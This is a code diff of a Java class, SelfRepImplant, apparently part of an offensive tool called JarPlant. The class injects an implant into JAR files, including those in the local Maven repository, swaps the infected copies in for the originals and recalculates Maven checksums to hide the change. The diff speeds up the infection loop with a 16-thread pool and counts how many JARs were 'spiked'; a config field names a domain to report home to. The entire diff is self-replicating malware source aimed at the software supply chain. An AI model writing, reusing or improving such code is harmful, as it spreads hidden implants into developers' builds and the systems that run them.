@@ -13,7 +13,12 @@ import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.security.SecureRandom;
 import java.text.DecimalFormat;
+import java.time.Duration;
 import java.util.*;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
+import java.util.concurrent.atomic.AtomicInteger;
 import java.util.jar.JarFile;
 import java.util.logging.Handler;
 import java.util.logging.Logger;
@@ -35,6 +40,8 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
      * Example: "~/.m2/repository/org/apache/maven;~/.m2/repository/org/springframework/boot"
      */
     static volatile String CONF_IGNORED_PATHS;
+
+    static volatile int CONF_THREADS = 16;
 
     /**
      * Domain to report home to.
@@ -126,57 +133,84 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
 
         System.out.println("[*] Implant: " + implantHandler.getImplantClassName());
 
-        int numInfected = 0;
+        long plantTick = System.nanoTime();
+
+        ExecutorService plantingThreads = Executors.newFixedThreadPool(CONF_THREADS);
+        AtomicInteger numInfected = new AtomicInteger(0);
         for (Path jarToImplant : jarsToImplant) {
-            // Potential optimization: Multi-thread this.
-            ClassInjector injector;
-            try {
-                injector = ClassInjector.createLoadedWith(implantHandler);
-            } catch (ImplantException e) {
-                // Future optimization: Have the ImplantHandler check whatever throws this exception.
-                throw new RuntimeException(e);
-            }
-
-            JarFiddler jar;
-            try {
-                jar = JarFiddler.buffer(jarToImplant);
-            } catch (IOException e) {
-                System.out.println("[-] Failed to read JAR '" + jarToImplant + "'. Skipping.");
-                continue;
-            }
-
-            Path outputTempFile;
-            try {
-                outputTempFile = createTempFileFor(jarToImplant);
-            } catch (IOException e) {
-                System.out.println("[-] Failed to get a temp file for '" + jarToImplant + "'. Skipping.");
-                continue;
-            }
-
-            try {
-                boolean didInfect = injector.injectInto(jar);
-                if (didInfect) {
-                    jar.write(outputTempFile, StandardOpenOption.CREATE_NEW);   // Atomic operation, failing on collision
-                    System.out.println("[+] JarPlant '" + jarToImplant.getFileName() + "' -> '" + outputTempFile.getFileName() + "'.");
-                    doTheSwitcharoo(jarToImplant, outputTempFile);
-                    numInfected++;
-                    System.out.println("[+] Spiked JAR '" + jarToImplant + "'.");
-
-                    recalculateMavenChecksumFile(jarToImplant);
-                } else {
-                    System.out.println("[!] JarPlant chose to _not_ infect '" + jarToImplant + "'.");
+            plantingThreads.submit(() -> {
+                ClassInjector injector;
+                try {
+                    injector = ClassInjector.createLoadedWith(implantHandler);
+                } catch (ImplantException e) {
+                    // Future optimization: Have the ImplantHandler check whatever throws this exception.
+                    throw new RuntimeException(e);
                 }
-            } catch (FileAlreadyExistsException e) {
-                System.out.println("[-] File '" + outputTempFile + "' already exist. Skipping to avoid problems.");
-            } catch (IOException e) {
-                System.out.println("[-] Failed to spike JAR '" + jarToImplant + "' (" + e.getMessage() + ")");
-                //e.printStackTrace();
 
-                cleanUpTempFile(outputTempFile);
-            }
+                JarFiddler jar;
+                try {
+                    jar = JarFiddler.buffer(jarToImplant);
+                } catch (IOException e) {
+                    System.out.println("[-] Failed to read JAR '" + jarToImplant + "'. Skipping.");
+                    return;
+                }
+
+                Path outputTempFile;
+                try {
+                    outputTempFile = createTempFileFor(jarToImplant);
+                } catch (IOException e) {
+                    System.out.println("[-] Failed to get a temp file for '" + jarToImplant + "'. Skipping.");
+                    return;
+                }
+
+                try {
+                    boolean didInfect = injector.injectInto(jar);
+                    if (didInfect) {
+                        jar.write(outputTempFile, StandardOpenOption.CREATE_NEW);   // Atomic operation, failing on collision
+                        System.out.println("[+] JarPlant '" + jarToImplant.getFileName() + "' -> '" + outputTempFile.getFileName() + "'.");
+                        doTheSwitcharoo(jarToImplant, outputTempFile);
+                        numInfected.incrementAndGet();
+                        System.out.println("[+] Spiked JAR '" + jarToImplant + "'.");
+
+                        recalculateMavenChecksumFile(jarToImplant);
+                    } else {
+                        System.out.println("[!] JarPlant chose to _not_ infect '" + jarToImplant + "'.");
+                    }
+                } catch (FileAlreadyExistsException e) {
+                    System.out.println("[-] File '" + outputTempFile + "' already exist. Skipping to avoid problems.");
+                } catch (IOException e) {
+                    System.out.println("[-] Failed to spike JAR '" + jarToImplant + "' (" + e.getMessage() + ")");
+                    cleanUpTempFile(outputTempFile);
+                }
+            });
         }
 
-        String successRatePercentage = getSuccessRatePercentage(numInfected, jarsToImplant.size());
+        // Wait for all threads to complete.
+        plantingThreads.shutdown();
+        try {
+            if (!plantingThreads.awaitTermination((long) CONF_THREADS * 10, TimeUnit.SECONDS)) {
+                System.out.println("[!] Some concurrent task(s) did not finnish!");
+
+                // Something is taking too long. Shutdown hard by interrupting all threads.
+                plantingThreads.shutdownNow();
+                if (!plantingThreads.awaitTermination(10, TimeUnit.SECONDS)) {
+                    System.out.println("[!] Some concurrent task(s) had to be shut down hard!");
+                    plantingThreads.shutdownNow();
+                    if (!plantingThreads.awaitTermination(10, TimeUnit.SECONDS)) {
+                        // Blood will be spilled.
+                    }
+                }
+            }
+        } catch (InterruptedException ignored) {
+            // Someone wants us terminated. Gracefully GTFO.
+            plantingThreads.shutdownNow();
+            Thread.currentThread().interrupt();
+        }
+
+        long plantTock = System.nanoTime();
+        System.out.println("[#] JarPlanting took " + Duration.ofNanos(plantTock - plantTick));
+
+        String successRatePercentage = getSuccessRatePercentage(numInfected.get(), jarsToImplant.size());
         System.out.println("[*] Spiked " + numInfected + " out of " + jarsToImplant.size() + " (" + successRatePercentage + ") JARs.");
 
         if (CONF_DOMAIN != null) {
